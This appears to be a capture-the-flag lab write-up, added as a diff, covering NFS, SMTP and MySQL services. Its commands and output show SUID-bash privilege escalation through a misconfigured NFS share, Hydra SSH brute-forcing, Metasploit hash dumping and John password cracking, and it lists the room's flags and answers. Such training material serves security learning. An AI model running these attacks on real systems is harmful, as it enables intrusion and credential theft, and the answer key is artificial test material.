@@ -388,3 +388,393 @@ Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
 
 Last login: Thu Jun  4 14:37:50 2020
 cappucino@polonfs:~$
+```
+We're done, right?
+Not quite, if you have a low privilege shell on any machine and you found that a machine has an NFS share you might be able to use that to escalate privileges, depending on how it is configured.
+What is root_squash?
+By default, on NFS shares- Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges. Not what we want. However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.
+SUID
+So, what are files with the SUID bit set? Essentially, this means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!
+Method
+This sounds complicated, but really- provided you're familiar with how SUID files work, it's fairly easy to understand. We're able to upload files to the NFS share, and control the permissions of these files. We can set the permissions of whatever we upload, in this case a bash shell executable. We can then log in through SSH, as we did in the previous task- and execute this executable to gain a root shell!
+The Executable
+Due to compatibility reasons, we'll use a standard Ubuntu Server 18.04 bash executable, the same as the server's- as we know from our nmap scan. You can download it here.
+Mapped Out Pathway:
+If this is still hard to follow, here's a step by step of the actions we're taking, and how they all tie together to allow us to gain a root shell:
+NFS Access ->
+Gain Low Privilege Shell ->
+Upload Bash Executable to the NFS share ->
+Set SUID Permissions Through NFS Due To Misconfigured Root Squash ->
+Login through SSH ->
+Execute SUID Bit Bash Executable ->
+ROOT ACCESS
+Lets do this!
+```text
+┌──(kali㉿kali)-[~/Downloads/learning_nfs]
+└─$ cp bash /tmp/mount/cappucino
+```
+```text
+┌──(kali㉿kali)-[/tmp/mount/cappucino]
+└─$ sudo chown root bash
+```
+```text
+┌──(kali㉿kali)-[/tmp/mount/cappucino]
+└─$ sudo chmod +s bash
+```
+```text
+┌──(kali㉿kali)-[/tmp/mount/cappucino]
+└─$ sudo chmod +x bash
+```
+First, change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user's home directory. *No answer needed*
+Download the bash executable to your Downloads directory. Then use "cp ~/Downloads/bash ." to copy the bash executable to the NFS share. The copied bash shell must be owned by a root user, you can set this using "sudo chown root bash"
+*No answer needed*
+Now, we're going to add the SUID bit permission to the bash executable we just copied to the share using "sudo chmod +[permission] bash". What letter do we use to set the SUID bit set using chmod? *s*
+Let's do a sanity check, let's check the permissions of the "bash" executable using "ls -la bash". What does the permission set look like? Make sure that it ends with -sr-x. *-rwsr-sr-x*
+```text
+┌──(kali㉿kali)-[/tmp/mount/cappucino]
+└─$ ls -lah bash    
+-rwsr-sr-x 1 root kali 1.1M Aug 19 16:25 bash
+```
+Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Lets run it with "./bash -p". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions. *No answer needed*
+What do we know?
+Okay, at the end of our Enumeration section we have a few vital pieces of information:
+1. A user account name
+2. The type of SMTP server and Operating System running.
+We know from our port scan, that the only other open port on this machine is an SSH login. We're going to use this information to try and bruteforce the password of the SSH login for our user using Hydra.
+Preparation
+It's advisable that you exit Metasploit to continue the exploitation of this section of the room. Secondly, it's useful to keep a note of the information you gathered during the enumeration stage, to aid in the exploitation.
+Hydra
+There is a wide array of customisability when it comes to using Hydra, and it allows for adaptive password attacks against of many different services, including SSH. Hydra comes by default on both Parrot and Kali, however if you need it, you can find the GitHub here.
+Hydra uses dictionary attacks primarily, both Kali Linux and Parrot OS have many different wordlists in the "/usr/share/wordlists" directory- if you'd like to browse and find a different wordlists to the widely used "rockyou.txt". Likewise I recommend checking out SecLists for a wider array of other wordlists that are extremely useful for all sorts of purposes, other than just password cracking. E.g. subdomain enumeration
+The syntax for the command we're going to use to find the passwords is this:
+"hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.184.252 ssh"
+Let's break it down:
+SECTION	FUNCTION
+hydra	Runs the hydra tool
+-t 16
+Number of parallel connections per target
+-l [user]	Points to the user who's account you're trying to compromise
+-P [path to dictionary]	Points to the file containing the list of possible passwords
+-vV
+Sets verbose mode to very verbose, shows the login+pass combination for each attempt
+[machine IP]	The IP address of the target machine
+ssh / protocol	Sets the protocol
+Looks like we're ready to rock n roll!
+```text
+hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.184.252 ssh
+```
+```found
+[22][ssh] host: 10.10.184.252   login: administrator   password: alejandro
+```
+What is the password of the user we found during our enumeration stage? *alejandro*
+```text
+administrator@polosmtp:~$ cat smtp.txt 
+THM{who_knew_email_servers_were_c00l?}
+```
+`Dead letter mail El correo con letra muerta o el correo que no se puede entregar es correo que no puede entregarse al destinatario ni devolverse al remitente. **el sistema guarda los mensajes incompletos en el archivo dead.** **letter del directorio $HOME**.`
+### Understanding MySQL
+What is MySQL?
+In its simplest definition, MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL). Too many acronyms? Let's break it down:
+Database:
+A database is simply a persistent, organised collection of structured data
+RDBMS:
+A software or service used to create and manage databases based on a relational model. The word "relational" just means that the data stored in the dataset is organised as tables. Every table relates in some way to each other's "primary key" or other "key" factors.
+SQL:
+MYSQL is just a brand name for one of the most popular RDBMS software implementations. As we know, it uses a client-server model. But how do the client and server communicate? They use a language, specifically the Structured Query Language (SQL).
+Many other products, such as PostgreSQL and Microsoft SQL server, have the word SQL in them. This similarly signifies that this is a product utilising the Structured Query Language syntax.
+How does MySQL work?
+MySQL, as an RDBMS, is made up of the server and utility programs that help in the administration of MySQL databases.
+The server handles all database instructions like creating, editing, and accessing data. It takes and manages these requests and communicates using the MySQL protocol. This whole process can be broken down into these stages:
+MySQL creates a database for storing and manipulating data, defining the relationship of each table.
+Clients make requests by making specific statements in SQL.
+The server will respond to the client with whatever information has been requested.
+What runs MySQL?
+MySQL can run on various platforms, whether it's Linux or windows. It is commonly used as a back end database for many prominent websites and forms an essential component of the LAMP stack, which includes: Linux, Apache, MySQL, and PHP.
+More Information:
+Here are some resources that explain the technical implementation, and working of, MySQL in more detail than I have covered here:
+https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html
+https://www.w3schools.com/php/php_mysql_intro.asp
+What type of software is MySQL? *relational database management system *
+What language is MySQL based on? *SQL*
+What communication model does MySQL use? *client-server *
+What is a common application of MySQL? *back end database*
+What major social network uses MySQL as their back-end database? This will require further research. *Facebook*
+`Who was involved in the Cambridge Analytica scandal? En la década de 2010, la consultora británica Cambridge Analytica recopiló datos de millones de usuarios de Facebook sin su consentimiento, principalmente para utilizarlos con un fin de propaganda política.`
+What do we know?
+Let's take a sanity check before moving on to try and exploit the database fully, and gain more sensitive information than just database names. We know:
+1. MySQL server credentials
+2. The version of MySQL running
+3. The number of Databases, and their names.
+Key Terminology
+In order to understand the exploits we're going to use next- we need to understand a few key terms.
+Schema:
+In MySQL, physically, a schema is synonymous with a database. You can substitute the keyword "SCHEMA" instead of DATABASE in MySQL SQL syntax, for example using CREATE SCHEMA instead of CREATE DATABASE. It's important to understand this relationship because some other database products draw a distinction. For example, in the Oracle Database product, a schema represents only a part of a database: the tables and other objects owned by a single user.
+Hashes:
+Hashes are, very simply, the product of a cryptographic algorithm to turn a variable length input into a fixed length output.
+In MySQL hashes can be used in different ways, for instance to index data into a hash table. Each hash has a unique ID that serves as a pointer to the original data. This creates an index that is significantly smaller than the original data, allowing the values to be searched and accessed more efficiently
+However, the data we're going to be extracting are password hashes which are simply a way of storing passwords not in plaintext format.
+Lets get cracking.
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ msfconsole -q
+```
+```text
+msf6 > search mysql_schemadump
+
+Matching Modules
+================
+```
+```text
+#  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  auxiliary/scanner/mysql/mysql_schemadump                   normal  No     MYSQL Schema Dump
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/mysql/mysql_schemadump
+```
+```text
+msf6 > use 0
+```
+```text
+msf6 auxiliary(scanner/mysql/mysql_schemadump) > options
+
+Module options (auxiliary/scanner/mysql/mysql_schemadump):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   DISPLAY_RESULTS  true             yes       Display the Results to the Screen
+   PASSWORD                          no        The password for the specified use
+                                               rname
+   RHOSTS                            yes       The target host(s), see https://gi
+                                               thub.com/rapid7/metasploit-framewo
+                                               rk/wiki/Using-Metasploit
+   RPORT            3306             yes       The target port (TCP)
+   THREADS          1                yes       The number of concurrent threads (
+                                               max one per host)
+   USERNAME                          no        The username to authenticate as
+```
+First, let's search for and select the "mysql_schemadump" module. What's the module's full name? *auxiliary/scanner/mysql/mysql_schemadump*
+```text
+msf6 auxiliary(scanner/mysql/mysql_schemadump) > set PASSWORD password
+PASSWORD => password
+```
+```text
+msf6 auxiliary(scanner/mysql/mysql_schemadump) > set RHOSTS 10.10.106.201
+RHOSTS => 10.10.106.201
+```
+```text
+msf6 auxiliary(scanner/mysql/mysql_schemadump) > set USERNAME root
+USERNAME => root
+```
+```text
+msf6 auxiliary(scanner/mysql/mysql_schemadump) > run
+
+[+] 10.10.106.201:3306    - Schema stored in: /home/kali/.msf4/loot/20220819200040_default_10.10.106.201_mysql_schema_117039.txt
+[+] 10.10.106.201:3306    - MySQL Server Schema 
+ Host: 10.10.106.201 
+ Port: 3306 
+ ====================
+
+---
+- DBName: sys
+  Tables:
+  - TableName: host_summary
+    Columns:
+    - ColumnName: host
+      ColumnType: varchar(60)
+    - ColumnName: statements
+      ColumnType: decimal(64,0)
+    - ColumnName: statement_latency
+      ColumnType: text
+TableName: x$waits_global_by_latency
+    Columns:
+    - ColumnName: events
+      ColumnType: varchar(128)
+    - ColumnName: total
+      ColumnType: bigint(20) unsigned
+    - ColumnName: total_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: avg_latency
+      ColumnType: bigint(20) unsigned
+    - ColumnName: max_latency
+      ColumnType: bigint(20) unsigned
+
+[*] 10.10.106.201:3306    - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+Great! Now, you've done this a few times by now so I'll let you take it from here. Set the relevant options, run the exploit. What's the name of the last table that gets dumped?
+*x$waits_global_by_latency*
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ msfconsole -q
+```
+```text
+msf6 > search mysql_hashdump
+
+Matching Modules
+================
+```
+```text
+#  Name                                    Disclosure Date  Rank    Check  Description
+   -  ----                                    ---------------  ----    -----  -----------
+   0  auxiliary/scanner/mysql/mysql_hashdump                   normal  No     MYSQL Password Hashdump
+```
+Awesome, you have now dumped the tables, and column names of the whole database. But we can do one better... search for and select the "mysql_hashdump" module. What's the module's full name? *auxiliary/scanner/mysql/mysql_hashdump *
+```text
+msf6 > use 0
+```
+```text
+msf6 auxiliary(scanner/mysql/mysql_hashdump) > options
+
+Module options (auxiliary/scanner/mysql/mysql_hashdump):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD                   no        The password for the specified username
+   RHOSTS                     yes       The target host(s), see https://github.co
+                                        m/rapid7/metasploit-framework/wiki/Using-
+                                        Metasploit
+   RPORT     3306             yes       The target port (TCP)
+   THREADS   1                yes       The number of concurrent threads (max one
+                                         per host)
+   USERNAME                   no        The username to authenticate as
+```
+```text
+msf6 auxiliary(scanner/mysql/mysql_hashdump) > set PASSWORD password
+PASSWORD => password
+```
+```text
+msf6 auxiliary(scanner/mysql/mysql_hashdump) > set RHOSTS 10.10.106.201
+RHOSTS => 10.10.106.201
+```
+```text
+msf6 auxiliary(scanner/mysql/mysql_hashdump) > set USERNAME root
+USERNAME => root
+```
+```text
+msf6 auxiliary(scanner/mysql/mysql_hashdump) > run
+
+[+] 10.10.106.201:3306    - Saving HashString as Loot: root:
+[+] 10.10.106.201:3306    - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
+[+] 10.10.106.201:3306    - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
+[+] 10.10.106.201:3306    - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
+[+] 10.10.106.201:3306    - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
+[+] 10.10.106.201:3306    - Saving HashString as Loot: carl:*EA031893AA21444B170FC2162A56978B8CEECE18
+[*] 10.10.106.201:3306    - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+Again, I'll let you take it from here. Set the relevant options, run the exploit. What non-default user stands out to you? *carl*
+```text
+┌──(kali㉿kali)-[~/Downloads/learning_smtp]
+└─$ nano hash_mysql (save carl:*EA031893AA21444B170FC2162A56978B8CEECE18)
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/learning_smtp]
+└─$ john hash_mysql --wordlist=/usr/share/wordlists/rockyou.txt               
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 128/128 AVX 4x])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+doggie           (carl)     
+1g 0:00:00:00 DONE () 100.0g/s 166000p/s 166000c/s 166000C/s helpme..bailey1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+Another user! And we have their password hash. This could be very interesting. Copy the hash string in full, like: bob:*HASH to a text file on your local machine called "hash.txt".
+Now, we need to crack the password! Let's try John the Ripper against it using: "john hash.txt" what is the password of the user we found? *doggie*
+Awesome. Password reuse is not only extremely dangerous, but extremely common. What are the chances that this user has reused their password for a different service?
+```text
+┌──(kali㉿kali)-[~/Downloads/learning_smtp]
+└─$ ssh carl@10.10.106.201         
+The authenticity of host '10.10.106.201 (10.10.106.201)' can't be established.
+ED25519 key fingerprint is SHA256:lzPSz2dnAUtAkM53Zn8G50umC6hWdyrSEcfYoFcGqF4.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.106.201' (ED25519) to the list of known hosts.
+carl@10.10.106.201's password: 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Aug 20 00:10:02 UTC 2022
+
+  System load:  0.0               Processes:           87
+  Usage of /:   41.7% of 9.78GB   Users logged in:     0
+  Memory usage: 32%               IP address for eth0: 10.10.106.201
+  Swap usage:   0%
+
+23 packages can be updated.
+0 updates are security updates.
+
+Last login: Thu Apr 23 12:57:41 2020 from 192.168.1.110
+carl@polomysql:~$ ls
+MySQL.txt
+carl@polomysql:~$ cat MySQL.txt 
+THM{congratulations_you_got_the_mySQL_flag}
+```
+### Further Learning
+Reading
+Here's some things that might be useful to read after completing this room, if it interests you:
+https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-exploits.html
+https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/
+Thank you
+Thanks for taking the time to work through this room, I wish you the best of luck in future.
+~ Polo
+
+## Privilege Escalation
+```text
+cappucino@polonfs:~$ ls
+bash
+cappucino@polonfs:~$ ./bash -p
+bash-4.4# whoami
+root
+bash-4.4# cat /root/root.txt
+THM{nfs_got_pwned}
+```
+### Understanding SMTP
+What is SMTP?
+SMTP stands for "Simple Mail Transfer Protocol". It is utilised to handle the sending of emails. In order to support email services, a protocol pair is required, comprising of SMTP and POP/IMAP. Together they allow the user to send outgoing mail and retrieve incoming mail, respectively.
+The SMTP server performs three basic functions:
+It verifies who is sending emails through the SMTP server.
+It sends the outgoing mail
+If the outgoing mail can't be delivered it sends the message back to the sender
+Most people will have encountered SMTP when configuring a new email address on some third-party email clients, such as Thunderbird; as when you configure a new email client, you will need to configure the SMTP server configuration in order to send outgoing emails.
+POP and IMAP
+POP, or "Post Office Protocol" and IMAP, "Internet Message Access Protocol" are both email protocols who are responsible for the transfer of email between a client and a mail server. The main differences is in POP's more simplistic approach of downloading the inbox from the mail server, to the client. Where IMAP will synchronise the current inbox, with new mail on the server, downloading anything new. This means that changes to the inbox made on one computer, over IMAP, will persist if you then synchronise the inbox from another computer. The POP/IMAP server is responsible for fulfiling this process.
+How does SMTP work?
+Email delivery functions much the same as the physical mail delivery system. The user will supply the email (a letter) and a service (the postal delivery service), and through a series of steps- will deliver it to the recipients inbox (postbox). The role of the SMTP server in this service, is to act as the sorting office, the email (letter) is picked up and sent to this server, which then directs it to the recipient.
+We can map the journey of an email from your computer to the recipient’s like this:
+![](https://raw.githubusercontent.com/polo-sec/writing/master/Security%20Challenge%20Walkthroughs/Networks%202/untitled.png)
+1. The mail user agent, which is either your email client or an external program. connects to the SMTP server of your domain, e.g. smtp.google.com. This initiates the SMTP handshake. This connection works over the SMTP port- which is usually 25. Once these connections have been made and validated, the SMTP session starts.
+2. The process of sending mail can now begin. The client first submits the sender, and recipient's email address- the body of the email and any attachments, to the server.
+3. The SMTP server then checks whether the domain name of the recipient and the sender is the same.
+4. The SMTP server of the sender will make a connection to the recipient's SMTP server before relaying the email. If the recipient's server can't be accessed, or is not available- the Email gets put into an SMTP queue.
+5. Then, the recipient's SMTP server will verify the incoming email. It does this by checking if the domain and user name have been recognised. The server will then forward the email to the POP or IMAP server, as shown in the diagram above.
+6. The E-Mail will then show up in the recipient's inbox.
+This is a very simplified version of the process, and there are a lot of sub-protocols, communications and details that haven't been included. If you're looking to learn more about this topic, this is a really friendly to read breakdown of the finer technical details- I actually used it to write this breakdown:
+https://computer.howstuffworks.com/e-mail-messaging/email3.htm
+What runs SMTP?
+SMTP Server software is readily available on Windows server platforms, with many other variants of SMTP being available to run on Linux.
+More Information:
+Here is a resource that explain the technical implementation, and working of, SMTP in more detail than I have covered here.
+https://www.afternerd.com/blog/smtp/
+What does SMTP stand for? *Simple Mail Transfer Protocol*
+What does SMTP handle the sending of? (answer in plural) *emails*
+What is the first step in the SMTP process? *SMTP handshake*
+What is the default SMTP port? *25*
+Where does the SMTP server send the email if the recipient's server is not available? *SMTP queue*
+On what server does the Email ultimately end up on? *POP/IMAP*
+Can a Linux machine run an SMTP server? (Y/N) *Y*
+Can a Windows machine run an SMTP server? (Y/N) *Y*
+
+## Flags / Answers
+- Great! If all's gone well you should have a shell as root! What's the root flag? ***THM{nfs_got_pwned}***
+- Great! Now, let's SSH into the server as the user, what is contents of smtp.txt ***THM{who_knew_email_servers_were_c00l?}***
+- What is the user/hash combination string? *carl:*EA031893AA21444B170FC2162A56978B8CEECE18*
+- What's the contents of MySQL.txt ***THM{congratulations_you_got_the_mySQL_flag}***
+
+## Notes / Lessons Learned
+[[Network Services]]
+
